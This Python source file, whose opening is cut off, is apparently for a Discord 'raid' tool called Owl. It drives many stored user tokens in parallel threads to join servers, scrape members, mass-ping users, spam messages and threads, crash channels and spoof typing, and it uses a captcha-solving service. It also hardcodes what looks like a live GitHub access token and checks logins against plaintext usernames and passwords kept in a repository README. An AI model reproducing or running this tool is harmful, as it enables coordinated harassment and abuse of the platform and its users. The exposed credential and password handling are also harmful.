                 {Fore.CYAN}║ {Fore.MAGENTA}04 {Fore.CYAN}║   {Fore.GREEN}Thread Spammer                   {Fore.CYAN}║{Fore.MAGENTA}   {Fore.CYAN}║ {Fore.GREEN}                         Inbox     {Fore.CYAN}║ {Fore.MAGENTA}15 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}05 {Fore.CYAN}║   {Fore.GREEN}Instant Raid                     {Fore.CYAN}║{Fore.MAGENTA} R {Fore.CYAN}║{Fore.RED}                    Coming Soon!    {Fore.CYAN}║ {Fore.MAGENTA}16 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}06 {Fore.CYAN}║   {Fore.RED}VC Flooder - OUTDATED            {Fore.CYAN}║ {Fore.MAGENTA}A {Fore.CYAN}║{Fore.RED}                    Coming Soon!    {Fore.CYAN}║ {Fore.MAGENTA}17 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}07 {Fore.CYAN}║   {Fore.GREEN}Token Checker                    {Fore.CYAN}║ {Fore.MAGENTA}I {Fore.CYAN}║{Fore.RED}                    Coming Soon!    {Fore.CYAN}║ {Fore.MAGENTA}18 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}08 {Fore.CYAN}║   {Fore.GREEN}Friend Spam                      {Fore.CYAN}║ {Fore.MAGENTA}D {Fore.CYAN}║{Fore.RED}                    Coming Soon!    {Fore.CYAN}║ {Fore.MAGENTA}19 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}09 {Fore.CYAN}║   {Fore.GREEN}Classic Spammer                  {Fore.CYAN}║ {Fore.MAGENTA}E {Fore.CYAN}║{Fore.RED}                    Coming Soon!    {Fore.CYAN}║ {Fore.MAGENTA}20 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}10 {Fore.CYAN}║   {Fore.GREEN}Channel Crasher                  {Fore.CYAN}║ {Fore.MAGENTA}R {Fore.CYAN}║{Fore.GREEN}                    Credits         {Fore.CYAN}║ {Fore.MAGENTA}21 {Fore.CYAN} ║   
                 {Fore.CYAN}║ {Fore.MAGENTA}11 {Fore.CYAN}║   {Fore.GREEN}Typing Trigger                   {Fore.CYAN}║ {Fore.MAGENTA}! {Fore.CYAN}║{Fore.GREEN}                    CLS             {Fore.CYAN}║ {Fore.MAGENTA}0 {Fore.CYAN}  ║   
                 {Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════════════╝
    

    """


    print(title)
    
    valid_tokens = open("valid.txt", "r").read().splitlines()
    print(f'{Fore.CYAN}╔═[{username}@Owl]')
    option = int(input(f'╚═[{Fore.MAGENTA}CHOICE{Fore.CYAN}]═>{Fore.MAGENTA} '))

    if option ==1:

        invitecode = input(f"{Fore.GREEN}[+] https://discord.gg/")
        attacktype = 'Joiner'
        extra = f'Invite : {invitecode}'
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=join_server, args=(token, invitecode, )).start()
        time.sleep(1)
        screen()


    elif option ==2:
        serverid = input("[+] Server ID: ")
        attacktype = "Leaver"
        extra = f"Server ID : {serverid}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=leave_server, args=(token, serverid, )).start()
        time.sleep(1)
        screen()

    elif option ==3:
        users = []
        import discum
        import os
        
        
        open("users.txt", "w")
        
        token = open("valid.txt").read().splitlines()[0]
        bot = discum.Client(token=token)
        
        os.system("cls||clear")
        print(f"{Fore.GREEN}[+] User scraper")
        serverid = input(f"{Fore.GREEN}Server ID: ")
        channelid = input(f"{Fore.GREEN}Channel ID: ")
        message_cnt = input(f"{Fore.GREEN}Message content: ")
        
        def close_after_fetching(resp, guild_id):
            if bot.gateway.finishedMemberFetching(guild_id):
                lenmembersfetched = len(bot.gateway.session.guild(guild_id).members) #this line is optional
                print(str(lenmembersfetched)+' members fetched') #this line is optional
                bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.close()
        
        def get_members(guild_id, channel_id):
            bot.gateway.fetchMembers(guild_id, channel_id, keep="all", wait=1) #get all user attributes, wait 1 second between requests
            bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bot.gateway.run()
            bot.gateway.resetSession() #saves 10 seconds when gateway is run again
            return bot.gateway.session.guild(guild_id).members
        
        members = get_members(serverid, channelid)
        memberslist = []
        
        for memberID in members:
            memberslist.append(memberID)
            print(memberID)
        
        f = open('users.txt', "a")
        for element in memberslist:
            f.write(element + '\n')
        f.close()
        os.system("cls||clear")
        for user in open("users.txt", "r").read().splitlines():
            users.append(user)
        
        
        attacktype = "Mass Ping"
        extra = f"Channel ID : {channelid} \n Message : {message_cnt}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=mass_ping, args=(token, users, channelid, message_cnt,)).start()
        screen() 

    elif option ==4:
        channelid = input(f"{Fore.GREEN}Channel ID: ")
        name = input(f"{Fore.GREEN}Thread Names: ")
        for token in valid_tokens:
            t = threading.Thread(target=create_threads, args=(token, channelid, name,)).start()
        screen() 
        
    elif option ==5:
        users = []
        import discum
        import os
        
        
        open("users.txt", "w")
        
        token = open("valid.txt").read().splitlines()[0]
        bot = discum.Client(token=token)
        
        os.system("cls||clear")
        print(f"{Fore.GREEN}[+] User scraper")
        channelid = input(f"{Fore.GREEN}Channel ID: ")
        serverid = input(f"{Fore.GREEN}Server ID: ")
        
        def close_after_fetching(resp, guild_id):
            if bot.gateway.finishedMemberFetching(guild_id):
                lenmembersfetched = len(bot.gateway.session.guild(guild_id).members) #this line is optional
                print(str(lenmembersfetched)+' members fetched') #this line is optional
                bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.close()
        
        def get_members(guild_id, channel_id):
            bot.gateway.fetchMembers(guild_id, channel_id, keep="all", wait=1) #get all user attributes, wait 1 second between requests
            bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bot.gateway.run()
            bot.gateway.resetSession() #saves 10 seconds when gateway is run again
            return bot.gateway.session.guild(guild_id).members
        
        members = get_members(serverid, channelid)
        memberslist = []
        
        for memberID in members:
            memberslist.append(memberID)
            print(memberID)
        
        f = open('users.txt', "a")
        for element in memberslist:
            f.write(element + '\n')
        f.close()
        os.system("cls||clear")
        for user in open("users.txt", "r").read().splitlines():
            users.append(user)
        channelid = input(f"{Fore.GREEN}Channel ID: ")
        message_cnt = input(f"{Fore.GREEN}Message content: ")
        attacktype = "Mass Ping"
        extra = f"Channel ID : {channelid} \n Message : {message_cnt}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=mass_ping, args=(token, users, channelid, message_cnt,)).start()
        input()    
        screen() 
    elif option ==6:
        print(f'{Fore.RED}This Feature Is Out Dated, It Aill Be Updated Soon')
        input(f'{Fore.RED}Press enter to continue')
        os.system('cls')
        screen()    
    elif option ==7:
        for token in valid_tokens:
            threading.Thread(target=Check, args=(token,)).start()
        valid_tokens = str(valid_tokens)
        valid_tokens = valid_tokens.replace('[', '').replace(']', '').replace("'", '').replace(',', '').replace(' ', '')
        print(valid_tokens)
        screen()
    
    elif option ==8:
        user = input(f"{Fore.GREEN}User (example !chrxst#0001): ")
        for token in valid_tokens:
            threading.Thread(target=friender, args=(token, user))
        screen()
    
    elif option ==9:
        channelid = input(f"{Fore.GREEN}[+] Channel ID: ")
        message = input(f"{Fore.GREEN}[+] Message content: ")
        inf = int(input(f"{Fore.GREEN}[+] How many messages to send (0 for infinite): "))
        attacktype = "Spammer"
        extra = f"Channel Id : {channelid} \n message : {message} \n Amount : {inf}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=message_spam, args=(token, message, channelid, inf, )).start()
        time.sleep(1)
        screen()
    
    elif option ==10:
        channelid = input(f"{Fore.GREEN}[+] Channel ID: ")
        attacktype = "Channel Crasher"
        extra = f"Channel ID : {channelid}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=crash_channel, args=(token, channelid, )).start()
        time.sleep(1)
        screen()
    
    elif option ==11:
        channelid = input(f"{Fore.GREEN}Channel ID: ")
        print(f"{Fore.GREEN}[+] Typing...")
        attacktype = "Typing Spoofer"
        extra = f"Channel ID : {channelid}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=typer, args=(token, channelid, )).start()
        screen()
    
    elif option ==12:
        bio = input(f"{Fore.GREEN}Bio Content: ")
        attacktype = "Bio Changer"
        extra = f"BIO : {bio}"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        for token in valid_tokens:
            t = threading.Thread(target=change_bio, args=(token, bio,)).start()
        time.sleep(1)
        screen()

    elif option ==13:
        attacktype = "Onliner"
        extra = "None"
        threading.Thread(target=attacklog, args=(attacktype, extra)).start()
        try:
            for token in valid_tokens:
                threading.Thread(target=onliner, args=(token,)).start()
            print(f"{Fore.GREEN}[+] Tokens are online ")
            time.sleep(1)
            main()
        except Exception as e:
            pass
        screen()
    elif option ==14:
        print(f'{Fore.RED}This Feature Is Out Dated, It Aill Be Updated Soon')
        input(f'{Fore.RED}Press enter to continue')
        
        screen()
    elif option ==15:
        repo=g.get_user().get_repo("Message")
        file = repo.get_contents("README.md")

        data = str(file.decoded_content)
        
        var = ''.join(data)
        strip1 = var.replace("'","")
        
        message = strip1.replace('\n','')
        
        
        repo=g.get_user().get_repo("a")
        file = repo.get_contents("README.md")
        
    

        repo=g.get_user().get_repo("a")
        file = repo.get_contents("README.md")
        data = str(file.decoded_content)
        data = data.replace(f' user - {username} ? password - {password} ? locked = False ? admin = False ? newm = True ',f' user - {username} ? password - {password} ? locked = False ? admin = False ? newm = False ')

        repo.update_file(f"README.md", "-", data, file.sha)
        
        message = str(message)
        
        print('------------------------------')
        print(f'{Fore.RED}Press enter to return to software')
        input()
        screen()

    elif option ==16:
        print(f'{Fore.RED}This Feature Is Not Out Yet, It Will Be Released Soon')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==17:
        print(f'{Fore.RED}This Feature Is Not Out Yet, It Will Be Released Soon')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==18:
        print(f'{Fore.RED}This Feature Is Not Out Yet, It Will Be Released Soon')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==19:
        print(f'{Fore.RED}This Feature Is Not Out Yet, It Will Be Released Soon')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==20:
        print(f'{Fore.RED}This Feature Is Not Out Yet, It Will Be Released Soon')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==21:
        print(f'Uhm All Creds to !chrxst#0001 LOL. yeah i dont know what to put here')
        input(f'{Fore.RED}Press enter to continue')
        screen()
    elif option ==0:
        screen()

    elif option not in (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 , 20, 21):
        print(f'{Fore.RED}Not an option.')
        input(f'{Fore.RED}Press enter to continue')
        screen()




kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

g = Github("010Sam010", "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")

key11 = input('Enter you capmonster key >> ')
capmonster_python = HCaptchaTask(key11)
os.system('cls')


title = f"""
                           {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗         {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗  {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗ 
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║   {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║ {Fore.CYAN}█{Fore.MAGENTA}╗ {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗  {Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝
                          {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║   {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║         {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗
                          {Fore.MAGENTA}╚{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗    {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╔{Fore.MAGENTA}╝{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}╗{Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║  {Fore.CYAN}█{Fore.CYAN}█{Fore.MAGENTA}║
                           {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝ {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝    {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝ {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}═{Fore.MAGENTA}╝{Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝  {Fore.MAGENTA}╚{Fore.MAGENTA}═{Fore.MAGENTA}╝




"""
print(title)


lr = input(f'{Fore.CYAN}[+] {Fore.CYAN}Login or register (1/2) : ')
if lr =='1':
    username = input(f'{Fore.CYAN}Enter Username : {Fore.WHITE}')
    password = input(f'{Fore.CYAN}Enter Password : {Fore.WHITE}')
    repo=g.get_user().get_repo("a")
    file = repo.get_contents("README.md")

    data = str(file.decoded_content)
    remove = data[0]




    var = ''.join(data)
    strip1 = var.replace("'","")
    strip2 = strip1.replace(remove,'')
    strip3 = strip2.replace('\n','')

    if f' user - {username} ? password - {password} ? locked = False ? admin = False ? newm = False ' in strip3:
        print('[+] Login Successful')
        new = ""
        Admin = False
        perms = True
        userlog()
    elif f' user - {username} ? password - {password} ? locked = False ? admin = False ? newm = True ' in strip3:
        print('[+] Login Successful')
        new = "Unread Message"
        Admin = False
        perms = True
        userlog()

    elif f' user - {username} ? password - {password} ? locked = False ? admin = True ? newm = False ' in strip3:
        Admin = True
        perms = True
        print('[+] Login Successful, Moderator')
        userlog()


        
    elif f' user - {username} ? password - {password} ? locked = False ? admin = False ? newm = False' not in strip3:
        print('[-] Login Failed')
        Admin = False
        perms = False
        userlog()
        sys.exit()

    elif f' user - {username} ? password - {password} ? locked = True ? admin = False ? newm = False' in strip3:
        print('[-] Login Failed, your accounts locked. Maybe you pissed off an admin??!? ')
        Admin = False
        perms = False
        userlog()
        input()
        sys.exit()
    else:
        sys.exit()
    
  

if lr =='2':
    keyfind()
else:
    sys.exit()